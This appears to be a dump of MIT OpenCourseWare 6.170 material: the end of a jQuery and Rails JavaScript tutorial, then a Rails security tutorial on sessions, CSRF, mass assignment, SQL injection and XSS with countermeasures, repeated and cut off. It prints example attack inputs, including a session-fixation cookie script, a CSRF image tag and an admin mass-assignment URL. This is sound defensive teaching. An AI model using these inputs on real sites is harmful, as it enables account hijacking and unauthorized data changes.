'/image.png'\n});\n.addClass() / .hasClass() / .removeClass() are handy functions for modifying classes:\n$('img').addClass('oneClass').addClass('twoClass').addClass('three four');\n$('img').removeClass('oneClass twoClass');\n.css() is similar to .attr() but works with css properties:\n$('img').css('display', 'none');\n.html() is like the .innerHTML property (from the DOM API) and returns everything inside the\nnode:\n// <p><a href=\"/\">Go home</a> or check out this image: <img src=\"/img.png\" /></p>\n$('p').html() // <a href=\"/\">Go home</a> or check out this image: <img src=\"/img.png\" />\n.val() gets the you value of form elements:\n$('input[type=password]').val() // What password got typed in?\nAnd many more! Check out .width()/.height(), and .toggleClass() in the docs.\n\nTraversing\nAPI docs: http://api.jquery.com/category/traversing/\njQuery makes it easy to iterate, to search through parents, and to search through siblings.\n.each(f(index, value)) takes a callback function and passes in the index and value of each\nelement:\n$('img').each(function(i, el) {\nvar src = $(el).attr('src');\nconsole.log(\"Image #\" + i + \" has src=\" + src);\n});\nNote that the this variable is bound to the iterated element inside the function, so we can instead\ndo this:\n$('img').each(function(i) {\nvar src = $(this).attr('src');\nconsole.log(\"Image #\" + i + \" has src=\" + src);\n});\n.parent() finds the direct parent, .parents() finds all parents,, .children() finds all direct children,\n.find() finds all children, direct or not. They all take optional selectors to filter by, i.e.\n$('img).parents('table') will find tables that contain images.\n.closest(selector) find the first ancestor that matches the css selector.\n.filter(selector) lets you narrow down elements selected, and .not(selector) will take the\nopposite.\n.eq(i) will take the i-th element, so $('img').eq(1) selects the 2nd image\n\nTopic 4: Event handling\nAPI docs: http://api.jquery.com/category/events/\nDOM \"events\" are a general concept that allows JS to respond to user input and other\nasynchronous changes on a webpage. jQuery makes it easy to handle them. The functions\nbelow all take callback functions as parameters - calling them binds the callbacks to be called\nwhen the corresponding events take place.\n.click() calls a function on click:\n$('img').click(function(event) {\n$(this).remove(); // let's remove any image when it's clicked.\nconsole.log('image was clicked!');\nconsole.log(event) // check out the event information\n});\nNote the event parameter passed to the callback function. All callback functions will generally\ntake in an event object - this contains useful information that contains different information\ndepending on the context. A click event will have information about the click location, for\nexample, while keydown events have information about which keys were pressed.\njQuery binds this to the DOM element that triggered the event. In the above example, this refers\nto the image that was clicked.\n●\n.dblclick() binds to double clicks\n●\n.focus() binds to \"focus\" for inputs - when you click inside a text box, when you expand a\ndropdown, for example\n●\n.blur() is the opposite of focus - when you leave a text box, for example\n●\n.change() is useful for when inputs change value\n●\n.scroll() binds to scroll events inside the element\n●\n.submit() binds to when a form gets submited\n●\n.keyup() and .keydown() bind to when keys are pressed - use the event's keyCode\nproperty to figure out what was pressed. (Printable characters will correspond to their\ncharacter codes, while other keys like arrow keys have codes as well.)\n$(document).keypress(function(e) {\n// e.keyCode == 38 for UP\n// e.keyCode == 65 for A\n// e.keyCode == 16 for SHIFT\n// e.keyCode == 13 for ENTER\n// etc\nconsole.log(e.keyCode); // DIY\n});\nSome handlers take two functions:\n\n$('img').hover(function() {\nconsole.log('mouse over');\n}, function() {\nconsole.log('mouse gone');\n});\nIt's important to realize that when you call these binding functions, they get attached to elements\nthat exist at the time of the function call. Thus, if you call $('img').click(..) and then add new\nimages, the new images won't have the click handlers attached.\nparent.on(eventName, target, handler) is useful to get around this, and also works on\nelements created in the future:\n$('.container').on(\"click\", \"img\", function(event) {\n// Works on an image on the page, now or future.\n});\n.ready() will be especially useful; the snippet you'll use the most will probably be:\n$(document).ready(function() {\n// Do DOM-related work here.\n});\nWhen the document finishes loading everything, the ready() handler is called. This is important if\nyou want to bind to DOM elements that may not have loaded at the time the script is called. The\nbelow code, for example, does not work:\n<script>\n// Binds to 0 img elements.\n$('img').click(function() { alert('clicked!'); });\n</script>\n<img src=\"image1.png\" />\n<img src=\"image2.png\" />\nThe browser will evaluate the script tag before building the img nodes, so no click handlers get\nattached. Especially since script tags should be included in the head and not body of the\ndocument, you'll find this true for most if not all of your event binding. Instead, you want:\n<script>\n$(document).ready(function() {\n// Binds to 2 img elements.\n$('img').click(function() { alert('clicked!'); });\n});\n</script>\n<img src=\"image1.png\" />\n<img src=\"image2.png\" />\nA final note on event propagation: Event propagation and event listeners are a relatively\ncomplicated subject in JavaScript, but it's useful to know some basics:\n●\nevent.preventDefault() stops the current element's default browser handler from being\n\ncalled. This is useful for overriding anchor tags, for example, and preventing the user\nfrom leaving the page when a link is clicked:\n$('a').click(function(event) {\nconsole.log('the link with href=' + $(this).attr('href') + ' was called!')\n// User stays on page.\nevent.preventDefault();\n});\n●\nevent.stopPropagation() prevents events from propagating to parent nodes. If you have\nan image inside a div and both have click handlers, returning false from the image's click\nhandlers will prevent the div's handler from being reached. This is useful, for example, for\nstopping a submit() action from reaching the parent form if you want to abort a submit or\nhandle it via AJAX instead.\n●\nreturn false from an event handler has the effect of doing both. This is considered bad\npractice - use preventDefault() or stopPropagation() instead.\n\nTopic 5: Effects and animations\nAPI docs: http://api.jquery.com/category/effects/\nLess important than the previous topics, jQuery's effects and animations can still save you a\ngood amount of work. Some examples (most take callback functions and length parameters):\n$('.container').hide(); // equivalent to setting display:none\n$('.container').show(); // also .toggle()\n$('.container').fadeIn(2000); // fade in over 2s, also .fadeOut() and .fadeToggle()\n$('.nav li).slideDown(); // also .slideUp() and .slideToggle()\n// Animate CSS properties:\n$('a').animate({\n'opacity': 0,\n'color': 'red'\n});\n// Stop any current animations and start a new one:\n$('a').stop().animate({\n'background-color': 'blue'\n});\n\nTopic 6: JavaScript and Rails\nIf you've worked with JavaScript before, you'll be familiar with using script tags in the beginning of\nyour document:\n<!DOCTYPE html>\n<html>\n<head>\n<script src=\"/path/to/script.js\"></script>\n...\nYou'll notice, however, that Rails doesn't do this. Instead, you'll see:\n<!DOCTYPE html>\n<html>\n<head>\n<%= javascript_include_tag \"application\" %>\n...\nThe method javascript_include_tag takes a list of JS files - each string can include or omit the\n\"js\" or \"js.coffee\" extension (it'll try to guess if necessary) and can be relative or absolute:\n<%= javascript_include_tag \"application\", \"visits\" %>\nGenerates:\n<script type=\"text/javascript\" src=\"/javascripts/application.js\"></script>\n<script type=\"text/javascript\" src=\"/javascripts/visits.js\"></script>\n<%= javascript_include_tag \"visits.js\", \"/absolute/path/tofile\" %>\nGenerates:\n<script type=\"text/javascript\" src=\"/javascripts/visits.js\"></script>\n<script type=\"text/javascript\" src=\"/absolute/path/tofile\"></script>\nA quick note on CoffeeScript (http://coffeescript.org/): CoffeeScript is a \"ruby-fied\" version\nof JavaScript that attempts to clean up a lot of syntatical issues in JS. The .js.coffee files get\npre-processed at deploy time into actual JavaScript. Some people like it; some people don't.\nWe don't require or suggest using it in this course, as it'll make it harder for TAs to consistently\ngrade code. When you see .js.coffee files, though, which rails will generate for you, now you\nknow it's looking for CoffeeScript. If you remove the files and use plain .js files you should be fine.\nYou'll notice your application.js (which is automatically included into your templates) looks like:\n//\n//= require jquery\n//= require jquery_ujs\n//= require_tree .\nWhat's happening here is Rails is using a pre-processor to clump all of your JS files together.\n\nThe idea is to allow you, the developer, to develop in separate JS files for reusability and logical\norganization. require directives indicate which dependencies your JS has, and require_tree .\ntells Rails to blindly include all the JS files in app/assets/javascript/ and its subfolders recursively.\nThis sounds bad, but in most cases this will actually be just fine. You might think that including\nexactly the JS files you need will help avoid unnecessary loading, but you're usually better off\nloading them all at once. At the cost of one slow load, the subsequent pages will all have their JS\ncached in the browser and loading will actually be faster. Furthermore, when Rails automatically\ncompresses the files into a single file for you (see below) only one HTTP request is made and\nthe download is faster.\nWhen you run in development mode, the JS files don't get modified and you'll see a long list of\nincluded JS tags:\n<script src=\"/assets/jquery.js?body=1\" type=\"text/javascript\"></script>\n<script src=\"/assets/jquery_ujs.js?body=1\" type=\"text/javascript\"></script>\n<script src=\"/assets/posts.js?body=1\" type=\"text/javascript\"></script>\n<script src=\"/assets/application.js?body=1\" type=\"text/javascript\"></script>\nIn production, though, you'll see much less:\n<script src=\"/assets/application-6cb7fbef54b7407f120c1360a22a4bfd.js\"\ntype=\"text/javascript\"></script>\nIn a process called the Rails Asset Pipeline (http://guides.rubyonrails.org/asset_pipeline.html),\nRails combs through your scripts, concatenates them together, minifies them (it shortens\nvariable names, removes newlines, and more to produce a mess like in\nhttp://code.jquery.com/jquery-1.9.1.min.js), and outputs them into a single file like\napplication-6cb7fbef54b7407f120c1360a22a4bfd.js.\nYou'll notice a long hash at the end of the filename - this is meant to guarantee that the filename\nproduced is different. As a result, your browser won't mistake the file for an older one and a\nfresh, non-cached version of the JS will be downloaded.\nLong story short, to work with JS in rails rename all your controllerspecific JS files (e.g.\nvisits.js.coffee, shopper.js.coffee inside app/assets/javascripts) to their pure JS counterparts\n(e.g. visits.js). Put JS in those files, and your application.js file will pick them up for you and you'll\nget them on every page.\n\nTopic 7: Beyond jQuery, and into \"web apps\"\nYou've seen how jQuery can be very useful for certain elements of web-development (AJAX,\nDOM manipulations, event handling, and so on), but there are other elements remaining that\nother libraries are handy for:\njQuery UI (http://jqueryui.com/) is an accompanying library that you'll see a lot as well. There are\nnice widgets like accordions, date pickers, tabs, sliders, spinners, and more. (As a word of\ncaution, though, these widgets tend to come with a very distinct default style that'll scream\n\"jQuery UI\" - you might notice yourself that you've seen them in quite a few places before.)\nhandlebars (http://handlebarsjs.com/) makes templating very easy. When you have more\nsophisticated web sites, you'll find yourself making AJAX calls to retrieve data and then\nformatting that data into HTML snippets to be inserted into the DOM. Handlebars uses\n\"templates\" to let you move from\n// Assuming you have some response, resp = {author: \"Josh\", body: \"A blog post!\"}\nvar snippet = '<div class=\"post\"><span class=\"author\">' + resp.author + '</span><div\nclass=\"content\">' + resp.content + '</div></div>'\nto something cleaner:\n<script id=\"entry-template\" type=\"text/x-handlebars-template\">\n<div class=\"post\">\n<span class=\"author\">{{ author }}</span>\n<div class=\"content\">{{ content }}</div>\n</div>\n</script>\n...\nvar source = $(\"#entry-template\").html(),\ntemplate = Handlebars.compile(source);\n// Assuming you have some response, resp = {author: \"Josh\", body: \"A blog post!\"}\nvar html = template(resp);\nInto Web Applications, or \"web apps\"\njQuery is very close to the DOM. You won't get utilities for anything at higher levels of\nprogramming, and you'll find there's more to JS than just the DOM!\nWhen your application gets more complicated, you'll find it developing more and more \"state\" per\nsession. (Think Google Docs, Facebook, Gmail for example.) Instead of rendering everything\nserver-side, you'll start asynchronously sending updates, handling local interactions, and\nevolving into less of a \"site\" and more of an \"application\" or \"web app.\"\nThis is where libraries like backbone.js (http://backbonejs.org/#introduction) and ember.js\n(http://emberjs.com/about/) come in. The big ideas they introduce are Models, Views, and\n\nControllers, which you'll find familiar from working with Rails. They essentially offer utilities to\nconnect your data with your DOM in a more explicit, thought-out manner. It has some overlap\nwith jQuery, especially when it comes to events, but it also offers models (not dissimilar to\nRails), a way to bind these models to events, and some convenient library methods to work with\nyour data.\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 7 Slides: Some Best Practices in Rails Security",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/b82ea9c98eb9b97faff3a44bb2d34e1e_MIT6_170S13_rec7-RailsSecs.pdf",
      "content": "6.170 Tutorial 7 - Rails Security\nIntroduction\nSessions\nSession Hijacking\nCountermeasures\nReplay Attacks\nCountermeasures\nSession Fixation\nCountermeasures\nCSRF\nHackers Love Mass Assignment\nCountermeasures\nInjection\nSQL Injection\nCross Site Scripting (XSS)\nCountermeasures\nLogging\nAuthorizing Ownership\nPrerequisites\nBasic understanding of how websites work.\nUnderstanding of how rails implements sessions (CookieStore, SessionStore).\nGoals of this tutorial\nUnderstand common security issues and learn how to prevent them in the Rails web framew\nResources\nRuby on Rails Security Guide: http://guides.rubyonrails.org/security.html\nSecurity Railscast: http://railscasts.com/episodes/178-seven-security-tips?view=asciicast\nHTML Escapes: http://api.rubyonrails.org/classes/ERB/Util.html\nMySpace Samy Worm (CSS Injection): http://namb.la/popular/tech.html\nork.\n\nIntroduction\nAccording to The Gartner Group, 97% percent of web applications are vulnerable to attack.\nThis tutorial will help you be in the 3%. Fortunately for us, Rails includes several mechanisms\nthat help with making your web applications secure. We will go over each in detail.\nFun fact: According to the Symantec Global Internet Security Threat Report, the underground\nprices for stolen bank login accounts range from $10-$1000 (depending on the available\namount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts\nand $4-$30 for email passwords [1].\nSessions\nMost applications need to keep track of certain state of a particular user. This could be the\ncontents of a shopping basket or the user id of the currently logged in user. Without the idea of\nsessions, the user would have to identify, and probably authenticate, on every request. Rails will\ncreate a new session automatically if a new user accesses the application. It will load an existing\nsession if the user has already used the application.\nA session usually consists of a hash of values and a session id, usually a 32character string, to\nidentify the hash. Every cookie sent to the client's browser includes the session id. And the other\nway round: the browser will send it to the server on every request from the client.\nBy default, Rails stores all session information in a cookie. It is important that you know the\nimplications of this. The cookie is signed but unencrypted. This means that anyone with the\ncookie can read its contents, but not modify them.\nIf read access to session data is not something your users should have, then consider using\nActiveRecord::SessionStore, which stores session data on the server rather than in a\ncookie.\nSession Hijacking\n-- Stealing a user's session id lets an attacker use the web application in the victim's name.\nMany web applications have an authentication system: a user provides a user name and\npassword, the web application checks them and stores the corresponding user id in the session\nhash. From now on, the session is valid. On every request the application will load the user,\nidentified by the user id in the session, without the need for new authentication. The session id in\nthe cookie identifies the session.\nHence, the cookie serves as temporary authentication for the web application. Everyone who\nseizes a cookie from someone else, may use the web application as this user - with possibly\nsevere consequences.\n\nCountermeasures\nFor the web application builder this means to provide a secure connection over SSL. In Rails 3.1\nand later, this could be accomplished by always forcing SSL connection in your application\nconfig file:\nconfig.force_ssl = true\nReplay Attacks\n-- Another sort of attack you have to be aware of when using CookieStore is the replay attack.\nImagine a site that uses credit to reward users for being awesome. The credits are stored in the\nsession (which is a bad idea already). A rogue user realizes this and decides to hack the\nsystem. Replay attacks happen like this:\n1.\nA user receives credits, the amount is stored in a session.\n2.\nThe user makes a copy of his cookie.\n3.\nThe user makes a purchase using his credits that are stored in his session (cookies).\n4.\nThe user takes the cookie from step 2 and replaces the current cookie in the browser.\n5.\nThe user has all of his credit again!\nCountermeasures\nIncluding a nonce (a random value) in the session solves replay attacks. A nonce is valid only\nonce, and the server has to keep track of all the valid nonces. It gets even more complicated if\nyou have several application servers (mongrels). Storing nonces in a database table would\ndefeat the entire purpose of CookieStore (avoiding accessing the database).\nThe best solution against it is not to store this kind of data in a session, but in the database. In\nthis case store the credit in the database and the logged_in_user_id in the session.\n\nSession Fixation\nThis attack focuses on fixing a user's session id known to the attacker, and forcing the user's\nbrowser into using this id. It is therefore not necessary for the attacker to steal the session id\nafterwards. Here is how this attack works:\n1.\nThe attacker creates a valid session id: He loads the login page of the web application\nwhere he wants to fix the session, and takes the session id in the cookie from the\nresponse (see number 1 and 2 in the image).\n2.\nHe possibly maintains the session. Expiring sessions, for example every 20 minutes,\ngreatly reduces the timeframe for attack. Therefore he accesses the web application\nfrom time to time in order to keep the session alive.\n3.\nNow the attacker will force the user's browser into using this session id (see number 3 in\nthe image). As you may not change a cookie of another domain (because of the same\norigin policy), the attacker has to run a JavaScript from the domain of the target web\napplication. Injecting the JavaScript code into the application by XSS accomplishes this\nattack. Here is an example:\n<script>document.cookie=\"_session_id=16d5b78abb28e3d6206b60f22a0\n3c8d9\";</script>.\n4.\nThe attacker lures the victim to the infected page with the JavaScript code. By viewing\nthe page, the victim's browser will change the session id to the trap session id.\n5.\nAs the new trap session is unused, the web application will require the user to\n \n \n\nauthenticate.\n6.\nFrom now on, the victim and the attacker will couse the web application with the same\nsession: The session became valid and the victim didn't notice the attack.\nCountermeasures\n-- One line of code will protect you from session fixation.\nThe most effective countermeasure is to issue a new session identifier and declare the old one\ninvalid after a successful login. That way, an attacker cannot use the fixed session identifier. This\nis a good countermeasure against session hijacking, as well. Here is how to create a new\nsession in Rails:\nreset_session\n\nCSRF\n-- This attack method works by including malicious code or a link in a page that accesses a web\napplication that the user is believed to have authenticated. If the session for that web application\nhas not timed out, an attacker may execute unauthorized commands.\nMost Rails applications use cookiebased sessions. Either they store the session id in the cookie\nand have a serverside session hash, or the entire session hash is on the clientside. In either\ncase the browser will automatically send along the cookie on every request to a domain, if it can\nfind a cookie for that domain. The controversial point is, that it will also send the cookie, if the\nrequest comes from a site of a different domain. Let's start with an example:\n●\nBob browses a message board and views a post from a hacker where there is a\ncrafted HTML image element. The element references a command in Bob's project\nmanagement application, rather than an image file.\n●\n<img src=\"http://www.webapp.com/project/1/destroy\">\n●\nBob's session at www.webapp.com is still alive, because he didn't log out a few\nminutes ago.\n●\nBy viewing the post, the browser finds an image tag. It tries to load the suspected\nimage from www.webapp.com. As explained before, it will also send along the cookie\n\nwith the valid session id.\n●\nThe web application at www.webapp.com verifies the user information in the\ncorresponding session hash and destroys the project with the ID 1. It then returns a\nresult page which is an unexpected result for the browser, so it will not display the\nimage.\n●\nBob doesn't notice the attack -- but a few days later he finds out that project number\none is gone.\nCountermeasures\nprotect_from_forgery :secret => \"1234567890123456789034567890...\"\nThis will automatically include a security token, calculated from the current session and the\nserverside secret, in all forms and Ajax requests generated by Rails. You won't need the\nsecret, if you use CookieStorage as session storage. If the security token doesn't match\nwhat was expected, the session will be reset.\nHackers Love Mass Assignment\n-- Without any precautions Model.new(params[:model]) allows attackers to set any database\ncolumn's value.\nThe massassignment feature may become a problem, as it allows an attacker to set any\nmodel's attributes by manipulating the hash passed to a model's new() method:\ndef signup\nparams[:user] # => {:name => \"ow3ned\", :admin => true}\n@user = User.new(params[:user])\nend\nMassassignment saves you much work, because you don't have to set each value individually.\nSimply pass a hash to the new method, or assign_attributes= a hash value, to set the\nmodel's attributes to the values in the hash. The problem is that it is often used in conjunction\nwith the parameters (params) hash available in the controller, which may be manipulated by an\nattacker. He may do so by changing the URL like this:\nhttp://www.example.com/user/signup?user[name]=ow3ned&user[admin]=1\nThis will set the following parameters in the controller:\nparams[:user] # => {:name => \"ow3ned\", :admin => true}\nNote that this vulnerability is not restricted to database columns. Any setter method, unless\nexplicitly protected, is accessible via the attributes= method. In fact, this vulnerability is\n\nextended even further with the introduction of nested mass assignment (and nested object\nforms) in Rails 2.3. The accepts_nested_attributes_for declaration provides us the\nability to extend mass assignment to model associations (has_many, has_one,\nhas_and_belongs_to_many). For example:\nclass Person < ActiveRecord::Base\nhas_many :children\naccepts_nested_attributes_for :children\nend\nclass Child < ActiveRecord::Base\nbelongs_to :person\nend\nAs a result, the vulnerability is extended beyond simply exposing column assignment, allowing\nattackers the ability to create entirely new records in referenced tables (children in this case).\nCountermeasures\nTo avoid this, Rails provides two class methods in your Active Record class to control access to\nyour attributes. The attr_protected method takes a list of attributes that will not be accessible\nfor massassignment. For example:\nattr_protected :admin\nattr_protected also optionally takes a role option using :as which allows you to define multipl\nmassassignment groupings. If no role is defined then attributes will be added to the :default rol\nattr_protected :last_login, :as => :admin\nA much better way, because it follows the whitelistprinciple, is the attr_accessible method. I\nis the exact opposite of attr_protected, because it takes a list of attributes that will be\naccessible. All other attributes will be protected. This way you won't forget to protect attributes\nwhen adding new ones in the course of development. Here is an example:\nattr_accessible :name\nattr_accessible :name, :is_admin, :as => :admin\ne\ne.\nt\nIf you want to set a protected attribute, you will to have to assign it individually:\nparams[:user] # => {:name => \"ow3ned\", :admin => true}\n@user = User.new(params[:user])\n@user.admin # => false # not mass-assigned\n@user.admin = true\n\n@user.admin # => true\nWhen assigning attributes in Active Record using attributes= the :default role will be used. To\nassign attributes using different roles you should use assign_attributes which accepts an\noptional :as options parameter. If no :as option is provided then the :default role will be used. You\ncan also bypass massassignment security by using the :without_protection option. Here is\nan example:\n@user = User.new\n@user.assign_attributes({ :name => 'Josh', :is_admin => true })\n@user.name # => Josh\n@user.is_admin # => false\n@user.assign_attributes({ :name => 'Josh', :is_admin => true }, :as => :admin)\n@user.name # => Josh\n@user.is_admin # => true\n@user.assign_attributes({ :name => 'Josh', :is_admin => true },\n:without_protection => true)\n@user.name # => Josh\n@user.is_admin # => true\nIn a similar way, new, create, create!, update_attributes, and\nupdate_attributes! methods all respect massassignment security and accept either :as\nor :without_protection options. For example:\n@user = User.new({ :name => 'Sebastian', :is_admin => true }, :as => :admin)\n@user.name # => Sebastian\n@user.is_admin # => true\n@user = User.create({ :name => 'Sebastian', :is_admin => true },\n:without_protection => true)\n@user.name # => Sebastian\n@user.is_admin # => true\nA more paranoid technique to protect your whole project would be to enforce that all models\ndefine their accessible attributes. This can be easily achieved with a very simple application\nconfig option of:\nconfig.active_record.whitelist_attributes = true\nThis will create an empty whitelist of attributes available for massassignment for all models in\n\nyour app. As such, your models will need to explicitly whitelist or blacklist accessible parameters\nby using an attr_accessible or attr_protected declaration. This technique is best applied at\nthe start of a new project. However, for an existing project with a thorough set of functional tests,\nit should be straightforward and relatively quick to use this application config option; run your\ntests, and expose each attribute (via attr_accessible or attr_protected) as dictated by your\nfailing tests.\n\nInjection\n-- Injection is a class of attacks that introduce malicious code or parameters into a web\napplication in order to run it within its security context. Prominent examples of injection are\ncrosssite scripting (XSS) and SQL injection.\nInjection is very tricky, because the same code or parameter can be malicious in one context,\nbut totally harmless in another. A context can be a scripting, query or programming language, the\nshell or a Ruby/Rails method.\nSQL Injection\nOne of the first rules of security is to never trust input from users. In Rails this means taking care\nof the items in the params hash. The user can control both the keys and the values in the\nparams hash, so all input must be considered suspicious.\nOne of the most common security issues is known as SQL injection. This happens when user\ninput is placed directly into a SQL query. If a user knows that their input is being directly inserted\ninto a query they can deliberately write input that can retrieve data that they should not see or\neven alter or destroy data in the database.\nCountermeasures\nInstead of passing a string to the conditions option, you can pass an array to sanitize tainted\nstrings like this:\nModel.where(\"login = ? AND password = ?\", user_name, password).first\nModel.where(:login => user_name, :password => password).first\n\nCross Site Scripting (XSS)\nCrosssite scripting is another common security issue to consider when developing web\napplications. It happens when you allow the users of your site to enter HTML or JavaScript\ndirectly. If you're not escaping the input that's entered by users, your site will be vulnerable to\nattack.\nAssume you're working on a question, answer site (like Quora). If we enter JavaScript into a\nnew question, surrounded by <script> tags, that script will be executed when the page reloads\nand every time it it viewed afterwards. For example if we entered <script>alert('hello')</script>\ninto a new question and submitted it, every subsequent time the page is viewed the user would\nsee an alert box.\nCausing an alert box to be shown on a page is annoying, but crosssite scripting can be used for\nmuch more malicious purposes. For example it could be used to read the cookies for the site's\nother users. The cookie could easily be sent to a remote server where the session id information\nin the cookie could be used to hijack another user's session.\nCountermeasures\nBefore rails 3, in order to stop these attacks you needed to escape any user input before you\ndisplay it on the screen. Instead of taking the question's content directly from the database and\noutputting it into the HTML stream, Rails provides a method simply called h to escape the\ncontent before it is output.\n<% @task.comments.each do |comment| %>\n<p><%= h(comment.content) %></p>\n<% end %>\nIn Rails 3, however, output is escaped automatically so there's no need to put the h method in\nyour views. The following snippets will result in the same output in Rails 3 (notice the difference\nis the h method).\n<div class=\"question\">\n<strong><%= link_to question.name, question.url %></strong>\n<p><%= question.content %></p>\n</div>\n<div class=\"question\">\n<strong><%= link_to h(question.name), question.url %></strong>\n<p><%= h question.content %></p>\n</div>\nThe html for both snippets looks the same and the output hasn't been doubleescaped. Rails is\n\nclever here; even if we use the h method it will escape the script tag only the once.\nIf we trust the content that the user enters, say they're an administrative user, and we want to\ndisplay exactly what they enter then we can use the new raw method to do that.\nRails 3 has a concept of HTMLsafe strings. This means that we can check if any string is safe\nto output as HTML by calling the new method html_safe? on it. We can mark a string as\nbeing HTMLsafe by calling the html_safe method on it. No actual escaping goes on here. All\nthat happens is that a boolean property is set against a string to determine whether it should be\nescaped before being output.\nSo how does this apply in our view template? Well, Rails looks at each piece of output and sees\nif it's marked as HTMLsafe. If it's not then it will be automatically escaped when it is output to the\nview. If it is safe then it is passed through without being escaped. If we use the h method to\nescape a string it will perform the escaping and mark the string as HTMLsafe. This means that\nRails 3 will see that the string is safe and not escape it again.\nWhen the raw method is used on a string it will be marked as HTMLsafe but not escaped,\nensuring that the string's content is passed to the output without being changed.\nLogging\n-- Tell Rails not to put passwords in the log files.\nBy default, Rails logs all requests being made to the web application. But log files can be a huge\nsecurity issue, as they may contain login credentials, credit card numbers et cetera. When\ndesigning a web application security concept, you should also think about what will happen if an\nattacker got (full) access to the web server. Encrypting secrets and passwords in the database\nwill be quite useless, if the log files list them in clear text. You can filter certain request\nparameters from your log files by appending them to config.filter_parameters in the\napplication configuration. These parameters will be marked [FILTERED] in the log.\nconfig.filter_parameters << :password\nConsider the following. Your application has signup and login forms in which users can enter\ntheir username and password. By default, Rails will store all form parameters as plain text which\nmeans that when we log in, our username and password are stored in the log file.\nWhile we've gone to the effort of encrypting our users' passwords in the database they are still\nclearly visible in the application's log file.\nOther field names can be added to the list of parameters if there are other fields that need to be\nfiltered.\n\nAuthorizing Ownership\nFor project 1, you were making a web analytics engine which allowed a site owner to view\nanalytics about his or her site. If we look at the page for a specific site in our application we can\nsee that the site's id is in the URL. Each user has their own collection of sites and we want to\nmake sure that one user cannot view another's sites.\nThe URL might be something like: http://localhost:3000/sites/1\nSite with ID 1 might belong to us, but what happens if we start altering the id? We now can\nguess other site IDs and see analytics. To fix this we need to look in our SitesController, in\nparticular at the code that gets the site from the database.\ndef show\n@project = Project.find(params[:id])\nend\nThis code will fetch any site by its `id`, with no authorisation to check that the site belongs to the\ncurrently loggedin user. There are a few ways we could do this, but one easy way is to use\nActiveRecord associations to get the site in the scope of the current user. As a site belongs_to a\nuser we can do this by changing the code above to:\ndef show\n@project = current_user.projects.find(params[:id])\nend\nThis will now scope the search to the sites that belong to the currently loggedin user. If we try to\nview another user's project now we'll see an error.\nActiveRecord::RecordNotFound in SitesController#show\nCouldn't find Site with ID=2 AND (\"sites\".user_id = 1)\nNote that the SQL condition in the error message has the current user's id in the select\ncondition. A RecordNotFound error means that when this application runs in production mode\nthe user will see a 404 page.\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 7: Rails Security",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/9d4bbcd029fd6ca32170ae93ede16c47_MIT6_170S13_rec7-RailsSec.pdf",
      "content": "6.170 Tutorial 7 - Rails Security\nIntroduction\nSessions\nSession Hijacking\nCountermeasures\nReplay Attacks\nCountermeasures\nSession Fixation\nCountermeasures\nCSRF\nHackers Love Mass Assignment\nCountermeasures\nInjection\nSQL Injection\nCross Site Scripting (XSS)\nCountermeasures\nLogging\nAuthorizing Ownership\nPrerequisites\nBasic understanding of how websites work.\nUnderstanding of how rails implements sessions (CookieStore, SessionStore).\nGoals of this tutorial\nUnderstand common security issues and learn how to prevent them in the Rails web framew\nResources\nRuby on Rails Security Guide: http://guides.rubyonrails.org/security.html\nSecurity Railscast: http://railscasts.com/episodes/178-seven-security-tips?view=asciicast\nHTML Escapes: http://api.rubyonrails.org/classes/ERB/Util.html\nMySpace Samy Worm (CSS Injection): http://namb.la/popular/tech.html\nork.\n\nIntroduction\nAccording to The Gartner Group, 97% percent of web applications are vulnerable to attack.\nThis tutorial will help you be in the 3%. Fortunately for us, Rails includes several mechanisms\nthat help with making your web applications secure. We will go over each in detail.\nFun fact: According to the Symantec Global Internet Security Threat Report, the underground\nprices for stolen bank login accounts range from $10-$1000 (depending on the available\namount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts\nand $4-$30 for email passwords [1].\nSessions\nMost applications need to keep track of certain state of a particular user. This could be the\ncontents of a shopping basket or the user id of the currently logged in user. Without the idea of\nsessions, the user would have to identify, and probably authenticate, on every request. Rails will\ncreate a new session automatically if a new user accesses the application. It will load an existing\nsession if the user has already used the application.\nA session usually consists of a hash of values and a session id, usually a 32character string, to\nidentify the hash. Every cookie sent to the client's browser includes the session id. And the other\nway round: the browser will send it to the server on every request from the client.\nBy default, Rails stores all session information in a cookie. It is important that you know the\nimplications of this. The cookie is signed but unencrypted. This means that anyone with the\ncookie can read its contents, but not modify them.\nIf read access to session data is not something your users should have, then consider using\nActiveRecord::SessionStore, which stores session data on the server rather than in a\ncookie.\nSession Hijacking\n-- Stealing a user's session id lets an attacker use the web application in the victim's name.\nMany web applications have an authentication system: a user provides a user name and\npassword, the web application checks them and stores the corresponding user id in the session\nhash. From now on, the session is valid. On every request the application will load the user,\nidentified by the user id in the session, without the need for new authentication. The session id in\nthe cookie identifies the session.\nHence, the cookie serves as temporary authentication for the web application. Everyone who\nseizes a cookie from someone else, may use the web application as this user - with possibly\nsevere consequences.\n\nCountermeasures\nFor the web application builder this means to provide a secure connection over SSL. In Rails 3.1\nand later, this could be accomplished by always forcing SSL connection in your application\nconfig file:\nconfig.force_ssl = true\nReplay Attacks\n-- Another sort of attack you have to be aware of when using CookieStore is the replay attack.\nImagine a site that uses credit to reward users for being awesome. The credits are stored in the\nsession (which is a bad idea already). A rogue user realizes this and decides to hack the\nsystem. Replay attacks happen like this:\n1.\nA user receives credits, the amount is stored in a session.\n2.\nThe user makes a copy of his cookie.\n3.\nThe user makes a purchase using his credits that are stored in his session (cookies).\n4.\nThe user takes the cookie from step 2 and replaces the current cookie in the browser.\n5.\nThe user has all of his credit again!\nCountermeasures\nIncluding a nonce (a random value) in the session solves replay attacks. A nonce is valid only\nonce, and the server has to keep track of all the valid nonces. It gets even more complicated if\nyou have several application servers (mongrels). Storing nonces in a database table would\ndefeat the entire purpose of CookieStore (avoiding accessing the database).\nThe best solution against it is not to store this kind of data in a session, but in the database. In\nthis case store the credit in the database and the logged_in_user_id in the session.\n\nSession Fixation\nThis attack focuses on fixing a user's session id known to the attacker, and forcing the user's\nbrowser into using this id. It is therefore not 